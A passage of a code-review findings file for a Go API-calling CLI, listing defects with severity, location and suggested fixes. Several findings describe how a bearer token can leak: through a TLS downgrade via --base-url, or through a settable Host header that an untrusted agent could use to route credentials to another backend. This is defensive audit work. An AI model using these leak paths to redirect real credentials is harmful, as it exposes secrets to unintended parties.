  CLAUDE.md.

## Finding 19: The allowed host set ignores the URL scheme, so an agent can downgrade TLS and keep the credential

- **Reviewer:** security
- **Severity:** WARN
- **Blocked-by:** design
- **Introduced-by:** `none` — `main` had no host binding, so it sent the credential over http
  regardless
- **Repeat-of:** none
- **File:** internal/request/hosts.go:142
- **Description:** Carried from cycle 3 finding 16, re-verified at HEAD. `hostOf` reduces a URL to
  `canonicalHost(parsed.Host, parsed.Scheme)`; the scheme decides which port is default and is then
  discarded, so `https://api.example.com` and `http://api.example.com` are one member. With the
  spec declaring only `https://...`, `--base-url http://...` puts a production bearer token on the
  wire in cleartext at exit 0 with nothing on stderr and no `credentials_withheld`. Held at WARN
  rather than CRIT because DESIGN.md's rule is literally host-scoped, the credential still reaches
  only a host the spec declares, and a real HTTPS-only API refuses the plaintext connection — but
  nothing warns, which is the part that should not ship.
- **Suggested fix:** DESIGN.md §5a defines the allowed set as "every host in the spec's `servers[]`"
  and never states whether a scheme downgrade is the same host; a fix must choose between (Y1)
  making the set scheme-aware so an http target against an https-only server is withheld, and (Y2)
  keeping the set host-only and emitting a `clierr.Warnf` naming the downgrade. Y2 preserves the
  local-twin ergonomics §5a is explicit about.

## Finding 20: The `Host` header is settable from `--header` and from a stored entry, and it decides who receives the credential without passing the host check

- **Reviewer:** security
- **Severity:** WARN
- **Blocked-by:** design
- **Introduced-by:** `none` — reproduces on a `main`-built binary
- **Repeat-of:** none
- **File:** internal/request/build.go:337
- **Description:** Carried from cycle 3 finding 17 and extended: the prior cycle recorded only the
  replay limb, and the `--header` limb is new. `binder.headers` accepts `Host` like any other field
  name, and `internal/replay`'s `headers()` forwards a stored one. Verified on both paths, with
  `Authorization` present and `credentials_withheld` empty in each case. `AllowedHosts` compares
  the *connect* target; the `Host` header is what a shared frontend (CDN, ingress, nginx vhost, API
  gateway) actually routes on, which is the normal deployment for the `api.example.com`-shaped
  hosts a spec declares. So the agent — the party §1 treats as untrusted — or an edited history
  file can move a production credential to a different backend on the same frontend. WARN rather
  than CRIT because delivery still requires the attacker to control a vhost behind a host the spec
  declares.
- **Suggested fix:** DESIGN.md §5a says a credential goes only to "a host the spec declares" but
  never states whether "host" means the connect target or the `Host` header; a fix must choose
  between (Y1) rejecting `Host` as a settable header and dropping it from a replayed entry, and
  (Y2) running a supplied `Host` value through `HostSet.Allows` alongside the base URL. Y1 is the
  smaller change and matches "there is no `--show-secrets` flag" in spirit. The replay limb is
  *not* design-blocked — §5a's replay table already answers it — and should be closed now under
  the existing text.

## Finding 21: `auth check` exits 2 on validation failures `call` never reaches

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d2cad54` (task 3) for the collision limb
- **Repeat-of:** none
- **File:** internal/config/auth.go:228
- **Description:** Carried from cycle 3 finding 18. `auth check` runs validations `call` does not,
  so it exits 2 on specs `call` handles. DESIGN.md §5's contract is that the two agree by
  construction; agreeing only in the satisfied/unsatisfied direction is not the whole contract,
  because an agent uses `auth check` to decide whether calling is worth attempting.
- **Suggested fix:** Run the same validation set on both paths, or downgrade the `auth check`-only
  failures to a reported condition in the payload rather than a non-zero exit.

## Finding 22: Two schemes that both map to `Authorization` emit two `Authorization` headers where `main` refused the call

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d2cad54` (task 3)
- **Repeat-of:** none
- **File:** internal/config/auth.go:373
- **Description:** Carried from cycle 3 finding 19. Two declared schemes that both resolve to an
  `Authorization` header now produce two such headers on the wire; `main` refused the call. Which
  one the server honours is server-dependent, so the resulting authentication is nondeterministic.
- **Suggested fix:** Refuse the combination with the existing collision error, or define and
  document a precedence rule. Either way the wire must carry exactly one `Authorization`.

## Finding 23: `credentials_withheld` names schemes whose credential was never set, contradicting `auth check`'s reading of the same word

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** none
- **File:** internal/request/build.go:546
- **Description:** Carried from cycle 3 finding 20. `binder.credentials` appends a `Withheld` for
  every `cred` in `b.in.Creds` when the host is off-set, without checking `cred.Present()`.
  `config.Resolve` returns an `Incomplete` alternative's credentials as a fallback, so an unset
  credential is in that slice. `cmd/talaria/auth.go:132-134` reasons the opposite way for the
  identical situation, *in a comment*: "A credential that is not set is not withheld: there is
  nothing to withhold, and reporting both would send a reader to `--allow-host` when what they need
  is to export the variable." The two surfaces disagree about what `withheld` means, and `call`
  gives the agent exactly the misdirection `auth check` was written to avoid. CLAUDE.md's "one name
  for one thing".
- **Suggested fix:** Gate the append on `cred.Ref.Present()` in `binder.credentials`, matching
  `authPayload`. A credential that is neither present nor withheld is simply absent, which the
  existing exit-5 path already reports.

## Finding 24: `spec.Servers` reads only root-level `servers[]`, so a path- or operation-level server is neither callable nor allowed

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `301338b` (task 1) — `internal/spec/servers.go` is new there; the withholding
  limb arrives with `d1548bf` and the "no base URL" limb reproduces on `main`
- **Repeat-of:** none
- **File:** internal/spec/servers.go:35
- **Description:** Carried from cycle 3 finding 25 with sharper evidence. OpenAPI 3.x lets a Path
  Item and an Operation each override `servers[]`. DESIGN.md §5a defines the allowed set as "every
  host in the spec's `servers[]`" — the spec's servers, not the document root's. `Servers` reads
  `doc.Model.Servers` only:
  ```
  call oplevel.yaml listPets --dry-run
    -> exit 2: "the spec declares no server, so pass --base-url..."   (false; it declares two)
  call oplevel.yaml listPets --base-url https://op.example.com --dry-run
    -> warning: bearerAuth withheld from op.example.com: it is not a host the spec declares
  ```
  Both messages state something false about the document. The outcome is fail-safe, but the tool
  refuses to authenticate against the operation's own declared server and tells the agent to pass
  `--allow-host` for a host the spec itself names. `README.md:210` repeats the incomplete claim.
- **Suggested fix:** Have `Servers` walk `doc.Model.Servers`, every `PathItem.Servers` and every
  `Operation.Servers`, substituting each the same way, and return the union (root first, order
  preserved, deduplicated) for the host set. `firstServer` should keep using the root list only,
  since operation-level servers are per-operation; honouring them for the base URL too needs an
  `operation.Operation` parameter and a DESIGN.md sentence. Add a fixture with all three levels.

## Finding 25: A server variable with no `default` substitutes to the empty string instead of omitting the server

- **Reviewer:** security, spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `301338b` (task 1)
- **Repeat-of:** none
- **File:** internal/spec/servers.go:64
- **Description:** Carried from cycle 3 finding 23, found independently by two reviewers.
  `substitute` records `defaults[name] = v.Default` unconditionally, so a variable declared with no
  `default` (or `default: ""`) substitutes to nothing rather than failing the server:
  ```
  servers: [{url: "https://{region}.api.example.com/v1", variables: {region: {}}}]
  call srv2.yaml listPets --dry-run
    -> "url":"https://.api.example.com/v1/pets"   exit 0
  ```
  That URL becomes both the default target *and* a member of the allowed host set —
  `.api.example.com`, an authority that names nothing. The function's own doc comment
  (`internal/spec/servers.go:22-23`) says "Callers treat every URL returned here as a usable base
  URL, so a template must never reach one", which this violates; per CLAUDE.md that comment asserts
  a property no test enforces. OpenAPI makes `default` REQUIRED on a server variable, so an absent
  one is a malformed spec — hostile input by CLAUDE.md's rule. The sibling case is handled
  correctly: `enum: [eu, us]` with no `default` omits the server.
- **Suggested fix:** Treat an empty `Default` as an unsubstitutable variable and omit the server,
  alongside the existing enum check. Add the case beside the enum case in
  `internal/spec/servers_test.go`.

## Finding 26: Server-variable `enum` alternatives are not in the allowed host set, and the message denies the spec declares them

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `301338b` (task 1)
- **Repeat-of:** none
- **File:** internal/spec/servers.go:57
- **Description:** Carried from cycle 3 finding 24. Only the `default` value of an enumerated server
  variable enters the host set, so calling a spec's own `us`-region server with `--base-url` is
  told "it is not a host the spec declares" — which the spec does. Fail-safe, but the message is
  false and the remedy it offers (`--allow-host`) makes the human re-declare something the document
  already declares.
- **Suggested fix:** Expand each enumerated variable across its `enum` values when building the
  allowed set (not when choosing the default target), bounded by the existing `maxServerURL` and by
  a cap on the cross-product.

## Finding 27: `history replay` can ship an empty `request.curl` at exit 0, and the condition propagates

- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `e47176c` (task 4)
- **Repeat-of:** none
- **File:** internal/curl/render.go:50
- **Description:** Carried from cycle 3 finding 21, reproduced end to end this cycle with a
  hand-written entry carrying both `request.headers["Content-Type"]` and a splitting
  `body.content_type`. `hasHeader` makes `document.body` skip `checkSplit` entirely, so the request
  succeeds; `Render` still bails and returns `""`. Result:
  ```
  {"request":{"curl":"","method":"POST",...},"response":{"status":200}}   exit 0, stderr empty
  ```
  The CRLF did not reach the wire, which is right. But the agent gets an empty reproduction with no
  signal at all, and DESIGN.md §3.4 promises "every executed call returns its curl equivalent". As
  Findings 6 and 9 both propose returning `""` for further shapes, this condition is about to
  become more reachable, not less.
- **Suggested fix:** Make an empty render an explicit, reported condition — a `clierr.Warnf` naming
  why no reproduction could be emitted, and an envelope field an agent can branch on — rather than
  an empty string. Decide it once, here, before Findings 6 and 9 add callers.

## Finding 28: Replay re-serialises stored pairs through `name=value`, so a name containing `=` re-splits at the wrong point

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** none
- **File:** internal/replay/replay.go:269
- **Description:** Carried from cycle 3 finding 22. Replay flattens each recorded pair to
  `name+"="+value` and re-parses downstream, so a name containing `=` splits at the wrong point and
  the replayed request carries a different parameter than the one recorded. The integration
  reviewer's round-trip did not trigger it in the shape tested (values containing `=` and `&`
  survived intact), so the defect is confined to `=` in the *name* — narrower than the prior cycle
  implied, and still silent when it fires.
- **Suggested fix:** Carry the pairs as structured `(name, value)` through to `request.Build`
  instead of flattening to a string and re-splitting. Add a case with `=` in the parameter name.

## Finding 29: A lone `--allow-host=` is silently dropped instead of reported, and the test that proves otherwise never goes through the CLI

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2) — `--allow-host` and `allowedHost` are both new there
- **Repeat-of:** none
- **File:** internal/request/hosts.go:164
- **Description:** **New this cycle.** `allowedHost` rejects an empty value, and `AllowedHosts`' doc
  comment (`internal/request/hosts.go:41-43`) argues explicitly that a silently dropped entry
  "looks exactly like a credential that was withheld for a good reason." It never fires for the
  single-value case:
  ```
  call ... --allow-host= --dry-run                     -> exit 0, no stderr
  call ... --allow-host= --allow-host='x y'            -> exit 2, both reported
  ```
  Cause: pflag's `GetStringArray` (`cmd/talaria/root.go:158`) round-trips the value through the
  flag's CSV string form; `stringArrayValue.String()` on `[""]` is `"[]"` and the conversion reads
  an empty payload as `[]string{}`, so the entry vanishes before `AllowedHosts` sees it.
  `TestAllowHostRejectsJunk` (`internal/request/hosts_test.go:146-176`) passes because it calls
  `AllowedHosts` and `request.Build` directly and never the command tree — the "green suite is not
  evidence" pattern in this branch's own conventions. Impact is confined to the missing error, since
  an empty host can never match, but the plan's task 2 adversarial requirement 4 demands the
  rejection explicitly.
- **Suggested fix:** Read the flag through `pflag.SliceValue.GetSlice()`, which does not round-trip
  through CSV. Add a CLI-level case to `cmd/talaria/call_test.go` asserting `--allow-host=` exits 2,
  since the unit test cannot reach this.

## Finding 30: The canary CLAUDE.md names as the gate on the file-body rule passes for the wrong reason

- **Reviewer:** security, integration
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `f8ef1d3` (task 5)
- **Repeat-of:** none
- **File:** internal/canary/canary_test.go:824
- **Description:** Carried from cycle 3 finding 26, mechanism re-confirmed.
  `TestARequestBodyFromAFileReachesNoSurfaceButTheWire` writes its canary into a field named
  `refresh_token`, which is in `secret.builtinBodyPaths`. The body-redaction limb therefore hides
  the value regardless of what `curl.Render` and `request.body` do — the test's own doc comment says
  *"each one alone would still leak"*, but the fixture makes the leaking limb unobservable. Swapping
  the field name to `client_secret` makes the test fail against HEAD, which is exactly how Finding 7
  survived a green suite. CLAUDE.md names this test as the gate on both halves of the rule; it
  currently gates neither.
- **Suggested fix:** Use a field name outside `builtinBodyPaths` (`client_secret`) so the assertion
  depends on the reference, not on path redaction. Add a second case using `--body -` for the stdin
  limb, which is untested entirely. Fix this with Finding 7, not after it.

## Finding 31: DESIGN.md §5a's allowed host set omits the active profile's own `base-url`, so §6's worked example silently withholds every credential

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** design
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** none
- **File:** internal/request/hosts.go:44
- **Description:** **New this cycle.** The code implements §5a's three sources exactly. The
  consequence is that a profile which sets only `base-url` withholds every credential from its own
  target:
  ```
  profiles: {staging: {base-url: http://127.0.0.1:33307}}
  call hist.yaml getPet --profile staging --dry-run
    warning: bearerAuth withheld from 127.0.0.1:33307: it is not a host the spec declares;
             pass --allow-host 127.0.0.1:33307 to send credentials there
  ```
  DESIGN.md §6's worked loop ends with `talaria call spec.yaml listUsers --profile staging  # final
  verification`, which under this rule sends no credential and gets a 401. A profile is a 0600 file
  a human wrote — the same trust level as `--allow-host`, which §5a admits without question — so
  requiring the host to be written twice is a papercut with a security-shaped failure mode. The
  stderr warning also offers only `--allow-host` and never mentions `allow_hosts:`.
- **Suggested fix:** DESIGN.md §5a lists three sources for the allowed set and never states whether
  the selected profile's own `base-url` host is a fourth. A fix must choose between (Y1) adding it
  — a human writing a base URL into a 0600 profile has explicitly allowed that host, which makes
  §6's example work as written — and (Y2) keeping the rule and amending §6's example plus the
  stderr warning to mention `allow_hosts:`. Y1 is one line plus a test; Y2 is doc-only.

## Finding 32: A broken spec's security requirement maps to exit 2, which DESIGN.md §4 defines as a usage error

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** design
- **Introduced-by:** `d2cad54` (task 3) — the branch's `Resolve` splits its terminal error into
  exit 5 / exit 2 where `main`'s was a single `clierr.Usage`; `checkEnvCollisions` is entirely new
- **Repeat-of:** none
- **File:** internal/config/auth.go:186
- **Description:** **New this cycle.** Three failure modes now map onto exit 2 —
  an undeclared scheme reached from `call`, the same from `auth check`, and
  `checkEnvCollisions`' two-schemes-one-variable refusal (`internal/config/auth.go:281`). All three
  describe a defect in the *document*, not in the invocation. DESIGN.md §4 defines 2 as "Usage
  error (unknown operation, missing required param — stderr JSON lists valid options)" and 3 as
  "Spec parse/load error"; `AGENT.md:198` tells an agent exit 2 means "fix the invocation using
  `valid_alternatives` and the message" — advice no agent can act on for a spec it did not write,
  and no `valid_alternatives` is emitted. CLAUDE.md was updated with the new rule and README:174-176
  documents the collision case, but DESIGN.md §4 was not amended. CLAUDE.md's own rule is *"A new
  failure mode maps to an existing code or the design doc changes — never both silently"*; here a
  new failure mode was mapped onto a code whose published meaning does not cover it, **and** the
  conventions file was changed — the "both silently" case the rule forbids.
- **Suggested fix:** DESIGN.md §4 must say which code a *semantically* invalid spec gets — 3
  ("Spec parse/load error", widened to "spec could not be used") or 2. Then either amend §4 and
  AGENT.md's exit-code table together, or move `unsupportedReason`'s undeclared branch and
  `checkEnvCollisions` to `clierr.SpecLoad`. `cmd/talaria/agentdoc_test.go` already cross-checks the
  AGENT.md table against `clierr.Code`, so the doc edit is cheap to keep honest.

## Finding 33: A response body with invalid UTF-8 is embedded raw in `--output json`, producing an envelope a strict JSON parser rejects

- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `none` — `git blame -L 75,88 cmd/talaria/call.go` is entirely the initial
  commit, and a `main`-built binary produces the same unparseable output
- **Repeat-of:** none
- **File:** cmd/talaria/call.go:81
- **Description:** **New this cycle.** `responseBody.MarshalJSON` embeds the body verbatim when it
  starts `{`/`[` and `json.Valid` accepts it. Go's `json.Valid` does not check UTF-8 validity inside
  strings, so arbitrary high bytes pass through into the envelope unescaped. Against a listener
  returning `Content-Type: application/json` and the bytes `{"a":"\xff\xfe"}`:
  ```
  exit 0, nothing on stderr; the raw 0xff 0xfe land in stdout
  python3 -c 'json.loads(...)' -> 'utf-8' codec can't decode byte 0xff in position 287
  ```
  DESIGN.md §3.1 makes machine-readable output a first principle and the versioned envelope the
  agent's contract. A server — untrusted input — can make the whole envelope unparseable by a Python
  or Rust agent at exit 0; a Go agent gets U+FFFD substitutions instead. `history.jsonl` is
  unaffected: `corpus.newBody` base64s invalid UTF-8, which is precisely the fix shape missing here.
- **Suggested fix:** Add a `utf8.Valid(trimmed)` conjunct to the embed test at
  `cmd/talaria/call.go:81`; an invalid-UTF-8 body then falls to `json.Marshal(string(b))`, which
  escapes it losslessly for the parser and matches the store's own lossy-display posture. Add a test
  asserting `json.Unmarshal` of the whole stdout succeeds for a `0xff`-carrying body.

## Finding 34: Shipped docs and code comments still advertise `run`, a command cut on 2026-08-03

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `none` — `git show main:README.md` carries the same text and this branch did
  not touch those lines, though README.md is otherwise in the diff (105 lines changed)
- **Repeat-of:** none
- **File:** README.md:435
- **Description:** Carried from cycle 3 finding 32 and **upgraded from INFO**, because the reviewer
  showed the documented flag value actually errors. README:435-438 documents a `--source` value that
  does not exist:
  ```
  $ talaria history --source run --output json
  {"error":{"code":2,"message":"no history source \"run\"","valid_alternatives":["call","replay"]}}
  ```
  README:23 also still lists "smoke-test whole APIs" as one of three capabilities, mirroring
  DESIGN.md:50, which v0.5 did not update when §7 struck the phase. Comments referencing the dead
  command survive at `internal/curl/config.go:149`, `:179`, `cmd/talaria/call.go:221` and
  `cmd/talaria/history.go:398`. CLAUDE.md's scope note names this the one capability deliberately
  ceded, so documentation that keeps offering it is a live trap for the next autonomous run — which
  reads README to learn the surface.
- **Suggested fix:** Rewrite README:435-438 to `call` and `replay` only; drop "smoke-test whole
  APIs" from README:23 and DESIGN.md:50 in the same edit; delete or reword the four `run` comments.
  `cmd/talaria/agentdoc_test.go` keeps AGENT.md honest and README has no such gate, which is why
  this survived four review cycles — consider extending it.

---

## Finding 35: `internal/replay`'s package doc claims every refusal has a test

- **Reviewer:** spec-compliance
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** none
- **File:** internal/replay/replay.go:11
- **Description:** Carried from cycle 3 finding 28. The package doc asserts every refusal path is
  covered by a test; several are not (Findings 11 and 12 are two of them). CLAUDE.md: "Never write a
  comment asserting a property no test enforces."
- **Suggested fix:** Add the missing cases or drop the claim. Task 18's scope.

## Finding 36: `--allow-host '*.example.com'` is accepted as a member that can never match

- **Reviewer:** spec-compliance
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** none
- **File:** internal/request/hosts.go:156
- **Description:** Carried from cycle 3 finding 29. A wildcard pattern is accepted into the host set
  and then never matches anything, since `HostSet.Allows` compares canonical hosts exactly.
  Fail-safe, but the human believes they allowed a host and the credential is withheld with a
  message that does not mention the wildcard.
- **Suggested fix:** Reject a value containing `*` at `allowedHost` with a message saying wildcards
  are not supported, so the failure is at the flag rather than at the request.

## Finding 37: The four new replay tests all fail on the parent commit for one shared, unrelated reason

- **Reviewer:** spec-compliance
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `c05ba96`
- **Repeat-of:** none
- **File:** internal/replay/replay_test.go:135
- **Description:** Carried from cycle 3 finding 30. The four tests `c05ba96` added do fail on its
  parent, but for a single shared reason unrelated to the behaviour each names — so they do not
  demonstrate the fix they ship with. CLAUDE.md: "you need a test that fails without your change",
  which means fails *for the reason the change addresses*.
- **Suggested fix:** Isolate each test from the shared cause so each fails on the parent for its own
  stated reason.

## Finding 38: The "no base URL" usage error prints its sentence twice

- **Reviewer:** spec-compliance
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `c05ba96` — `git log -S ErrNoBaseURL -- internal/request/build.go` returns only
  that commit; `main:internal/request/build.go:167` emitted the sentence once
- **Repeat-of:** none
- **File:** internal/request/build.go:186
- **Description:** Carried from cycle 3 finding 11 and **downgraded from WARN**. `ErrNoBaseURL`
  already carries the full sentence, and line 186 wraps it with the same sentence again:
  ```
  {"code":2,"message":"cannot build a request for listPets: no base URL: the spec declares no
   server, so pass --base-url or set one in a profile: the spec declares no server, so pass
   --base-url or set one in a profile"}
  ```
  Downgraded because the exit code and `valid_alternatives` are unaffected — `clierr.From` uses
  `errors.As`, so the code survives the wrap — and nothing an agent branches on changes. It is a
  cosmetic defect in a message, not wrong information.
- **Suggested fix:** `return "", ErrNoBaseURL` at `internal/request/build.go:186`.

## Finding 39: Documentation cross-references point at mechanisms and surfaces that do not exist

- **Reviewer:** spec-compliance, integration
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `e47176c` (task 4) for the `--dry-run` claim; `e2e4a9d` (task 6) for the
  CLAUDE.md cross-references
- **Repeat-of:** none
- **File:** internal/curl/render.go:49
- **Description:** Carried from cycle 3 finding 31, with the specific instance now pinned.
  `curl.Render`'s Content-Type guard is justified by "`history replay --dry-run` takes that media
  type from the history file" — but `history replay` registers only `--allow-mutations`
  (`cmd/talaria/history.go:246`), and `talaria history replay --help | grep dry-run` returns
  nothing. `internal/curl/config.go:290` repeats the claim. The guard itself is correct and worth
  keeping as the last gate; the justification is not. CLAUDE.md's own worked example cites the same
  non-existent surface.
- **Suggested fix:** Reword to the real reason — `Render` is called from `callPayload` on a
  `Request` that `internal/request` did not build (a replayed entry), and it must not emit a command
  `BuildConfig` would refuse. Fix the CLAUDE.md cross-reference in the same commit.

## Finding 40: `//nolint` waivers name task 1, which is complete, while the debt belongs to tasks 13 and 14

- **Reviewer:** spec-compliance, concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `e2e4a9d` (task 6) for the source waivers; `89ad251` for `.golangci.yml`
- **Repeat-of:** none
- **File:** internal/spec/source.go:117
- **Description:** Replaces cycle 3 finding 33, which claimed three stale `TRACKED DEBT (phase-2a
  task 1)` waivers in `.golangci.yml`; there is **one** there, and it is still load-bearing —
  removing it makes `contextcheck` fire at `cmd/talaria/root.go:320`. The real problem is the task
  numbers. `internal/spec/source.go:117-122` and `internal/curl/version.go:42-45` both carry
  `// TRACKED DEBT (phase-2a task 1)` with "Remove this waiver in the commit that fixes it", but
  task 1 is "Substitute server variables and expose the spec's server URLs" and is done. The
  spec-fetch context belongs to task 14 and the version preflight to task 13. A future audit
  grepping for the waiver's own task number finds a completed task and either removes a live waiver
  or leaves the debt untracked. `.golangci.yml:71-76` has the same problem and additionally
  describes "the two noctx waivers in internal/spec and internal/curl" as waivers when the file
  contains no such exclusions.
- **Suggested fix:** Renumber to `phase-2a task 14` and `phase-2a task 13` in both the prose and the
  `//nolint` directives, and correct the `.golangci.yml` comment to name the `//nolint` sites rather
  than non-existent exclusions.

## Finding 41: `.golangci.yml`'s errcheck exclusion permits exactly the write-path dropped `Close` its own comment says it does not

- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `89ad251` — the file does not exist on `main`
- **Repeat-of:** none
- **File:** .golangci.yml:37
- **Description:** **New this cycle.** The comment reads *"A deferred Close on a read handle
  releases nothing a caller can act on. A dropped error on a *write* path is the cache-poisoning
  class, and is not excluded here."* The two entries beneath it — `(io.Closer).Close` and
  `(*os.File).Close` — are typed by receiver, not by open mode, so they exclude write handles too.
  Proved by dropping a scratch file containing `f, _ := os.Create(path); defer f.Close();
  f.Write(data)` into `internal/corpus` and running the linter: only `unused` was reported. No live
  site violates the claim today — `corpus.write`, `corpus.replace`, `spec.writeCache` and
  `curl.newCapture` all check the final `Close` — so this is INFO. It matters because CLAUDE.md
  makes `.golangci.yml` the file where every exclusion records *why*, and this reason describes a
  narrower exclusion than the one configured.
- **Suggested fix:** Either narrow the exclusion to read paths via `exclusions.rules` with a
  `path:`/`text:` pair, or rewrite the comment to say what is true: all `Close` errors are excluded,
  and write-path `Close` is checked by convention and review, not by the linter.

## Finding 42: `--timeout` has no upper bound, and the comment says it does

- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `none` — `git show main:internal/curl/config.go` carries `withDefaults` and its
  comment unchanged
- **Repeat-of:** none
- **File:** internal/curl/config.go:53
- **Description:** Carried from cycle 3 finding 34 and re-measured rather than assumed. The comment
  states *"an unbounded call is exactly what these options exist to prevent, so there is
  deliberately no way to ask for one."* Measured against HEAD: `--timeout 1e9` yields
  `max-time = "1000000000"` (31 years, effectively unbounded); `--timeout 2e10` overflows the
  `float64`-to-`time.Duration` conversion to a negative, which `withDefaults` reads as "unset" and
  **silently** replaces with 30s. Both directions of the claim are false. Not reachable from
  untrusted input — the flag is caller-chosen — hence INFO, and the silent fallback is fail-safe.
- **Suggested fix:** Reject a `--timeout` above a stated ceiling with exit 2 rather than clamping
  silently, and put the ceiling in DESIGN.md so the exit-code contract stays published. Otherwise
  drop the claim. Task 18 territory.

## Finding 43: `preflight`'s `sync.Once` is keyed on nothing, and its stated reason names a command that was removed

- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `none` — the `var` block and its comment are unchanged from `main`; this
  branch's only edit to `version.go` added two `//nolint` comments
- **Repeat-of:** none
- **File:** internal/curl/version.go:41
- **Description:** Carried from cycle 3 finding 35, with one detail the prior cycle did not note.
  `ExecuteWith` re-resolves `exec.LookPath("curl")` on every call
  (`internal/curl/exec.go:58`) but `preflight` memoises on the first invocation regardless of
  `path`, so on call 2+ the version gate never runs against a newly-resolved binary;
  `internal/curl/exec.go:86` claims "a PATH change mid-run cannot swap the binary between the
  preflight and the call", true for the executed path and false for the checked one. **New detail:**
  the memo's own justification at `internal/curl/version.go:27-28` reads "it is the same binary
  every time, and `run` executes hundreds of calls" — `talaria run` was removed on 2026-08-03, so
  the stated reason for the memoisation no longer exists. Unreachable in practice: single-shot CLI.
- **Suggested fix:** Key the memo on the resolved path, or resolve once and pass the path to both
  the preflight and the execution; rewrite the comment without the reference to `run`. Fold into
  task 13.

## Finding 44: A comment in the spec cache describes a race that cannot occur

- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `89ad251`
- **Repeat-of:** none
- **File:** internal/spec/source.go:174
- **Description:** Carried from cycle 3 finding 36 and re-verified empirically.
  `defer os.Remove(tmp.Name()) //nolint:errcheck // Best effort: the rename below usually wins the
  race with it.` The deferred `Remove` runs strictly *after* the `os.Rename` at `:190` in the same
  function — happens-before ordering, not a race — and "usually wins" is not a property anything
  could enforce. Confirmed: 30 concurrent processes against one cache directory left exactly one
  cache file and **zero** `.tmp-*` leftovers, so the deferred `Remove` is a guaranteed `ENOENT`.
- **Suggested fix:** Reword to the actual reason the error is discarded: the rename has already
  consumed the temp file, so the remove is expected to fail with `ENOENT`.

## Finding 45: An archived findings file carries raw NUL bytes, so git treats it as binary

- **Reviewer:** integration
- **Severity:** INFO
- **Blocked-by:** none
- **Introduced-by:** `ebeb244` ("docs: archive review cycle 1 findings")
- **Repeat-of:** none
- **File:** docs/review/20260804-184701-cycle1-findings.md:77
- **Description:** **New this cycle.** The archived cycle-2 findings file contains five literal NUL
  bytes — written into the prose while describing the NUL-injection finding itself — so git
  classifies it as binary and `git diff --stat` shows `Bin 0 -> 42194 bytes` where every sibling
  archive shows a line count. The archive is therefore undiffable and unmergeable, and plain `grep`
  skips it silently. This is the same byte that already cost `.ralph/loop.sh` a defect class: every
  counter in it carries `-a` specifically because the findings files quote control characters.
- **Suggested fix:** Replace the five NUL bytes with an escaped rendering (`\x00` or `U+0000`) in
  the archived file, as this findings file does. Have the archival step in `.ralph/loop.sh` escape
  control characters when it copies, so the next cycle cannot reintroduce it.
